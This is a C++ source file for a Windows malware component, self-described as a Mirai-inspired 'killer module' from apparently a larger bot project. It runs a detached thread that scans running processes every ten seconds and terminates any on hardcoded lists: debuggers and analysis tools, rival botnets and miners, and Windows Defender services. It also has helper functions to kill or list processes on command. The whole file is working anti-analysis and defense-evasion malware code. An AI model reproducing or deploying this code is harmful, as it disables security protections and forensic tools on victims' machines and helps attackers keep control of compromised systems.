#include "killer.h"
#include "utils.h"
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>
#include <sstream>
#include <set>

// ============================================================================
// Phase 9: KILLER MODULE (Mirai-Inspired)
// Functionality:
//   1. Background thread that periodically scans for "forbidden" processes
//   2. Terminates competing malware, analysis tools, and AV processes
//   3. Reports kill count
// ============================================================================

// --- Forbidden Process Lists ---

// Analysis & debugging tools to kill
static const std::vector<std::string> ANALYSIS_TARGETS = {
    "wireshark.exe", "fiddler.exe", "procmon.exe", "procmon64.exe",
    "procexp.exe", "procexp64.exe", "x64dbg.exe", "x32dbg.exe",
    "ollydbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
    "pestudio.exe", "dnspy.exe", "ghidra.exe",
    "tcpview.exe", "autoruns.exe", "filemon.exe", "regmon.exe",
    "processhacker.exe"
};

// Known competing malware / botnets
static const std::vector<std::string> COMPETITOR_TARGETS = {
    "mirai.exe", "qbot.exe", "emotet.exe", "trickbot.exe",
    "coinminer.exe", "xmrig.exe", "minergate.exe"
};

// AV processes (optional, aggressive mode)
static const std::vector<std::string> AV_TARGETS = {
    "msmpeng.exe",          // Windows Defender
    "mpcmdrun.exe",         // Defender CLI
    "securityhealthservice.exe",
    "securityhealthsystray.exe"
};

// --- State ---
static std::atomic<bool> g_killer_running(false);
static std::thread g_killer_thread;
static std::atomic<int> g_kill_count(0);

// --- Helpers ---

static std::string str_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

static bool kill_pid(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return false;
    BOOL ok = TerminateProcess(h, 1);
    CloseHandle(h);
    return ok != FALSE;
}

static std::vector<std::pair<DWORD, std::string>> enumerate_processes() {
    std::vector<std::pair<DWORD, std::string>> result;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return result;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            result.push_back({ pe.th32ProcessID, pe.szExeFile });
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return result;
}

// --- Killer Loop ---

static void killer_loop() {
    log_msg("[KILLER] Started. Hunting for targets...");

    // Build combined target set (all lowercase)
    std::set<std::string> targets;
    for (auto& t : ANALYSIS_TARGETS)   targets.insert(str_lower(t));
    for (auto& t : COMPETITOR_TARGETS) targets.insert(str_lower(t));
    for (auto& t : AV_TARGETS)         targets.insert(str_lower(t));

    DWORD my_pid = GetCurrentProcessId();

    while (g_killer_running.load()) {
        auto procs = enumerate_processes();
        for (auto& p : procs) {
            if (p.first == my_pid) continue; // Don't kill ourselves
            if (p.first <= 4) continue;       // Skip System/Idle

            std::string name = str_lower(p.second);
            if (targets.count(name)) {
                if (kill_pid(p.first)) {
                    g_kill_count++;
                    log_msg("[KILLER] Terminated: " + p.second + " (PID " + std::to_string(p.first) + ")");
                }
            }
        }
        // Scan every 10 seconds
        for (int i = 0; i < 100 && g_killer_running.load(); i++) {
            Sleep(100);
        }
    }
    log_msg("[KILLER] Stopped.");
}

// --- Public API ---

void killer_start() {
    if (g_killer_running.load()) return;
    g_killer_running = true;
    g_killer_thread = std::thread(killer_loop);
    g_killer_thread.detach();
}

void killer_stop() {
    g_killer_running = false;
}

std::string killer_status() {
    std::string status = g_killer_running.load() ? "RUNNING" : "STOPPED";
    return "Killer: " + status + " | Kills: " + std::to_string(g_kill_count.load());
}

std::string kill_process(const std::string& proc_name) {
    std::string target = str_lower(proc_name);
    auto procs = enumerate_processes();
    int killed = 0;

    for (auto& p : procs) {
        if (str_lower(p.second) == target) {
            if (kill_pid(p.first)) {
                killed++;
            }
        }
    }
    return killed > 0
        ? "Killed " + std::to_string(killed) + " instance(s) of " + proc_name
        : "Process not found: " + proc_name;
}

std::string list_processes() {
    auto procs = enumerate_processes();
    std::ostringstream ss;
    ss << "=== Running Processes (" << procs.size() << ") ===\n";
    ss << "PID        | Name\n";
    ss << "-----------+----------------------------\n";
    for (auto& p : procs) {
        char line[256];
        snprintf(line, sizeof(line), "%-10lu | %s\n", p.first, p.second.c_str());
        ss << line;
    }
    return ss.str();
}
